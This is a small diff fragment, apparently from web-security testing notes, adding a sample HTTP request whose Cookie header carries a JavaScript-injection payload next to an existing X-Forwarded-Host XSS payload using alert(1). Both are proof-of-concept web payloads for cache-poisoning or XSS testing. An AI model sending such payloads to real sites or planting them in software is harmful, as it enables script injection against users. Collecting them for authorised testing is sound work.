@@ -534,6 +534,10 @@ for old browsers
 
 x-forwarded-host: a."><script>alert(1)</script>"
 
+GET / HTTP/1.1
+Host: example.com
+Cookie: session:VIMoamgioofjami; fehost=hossam"%2balert(1)%2b"
+
 
 
 
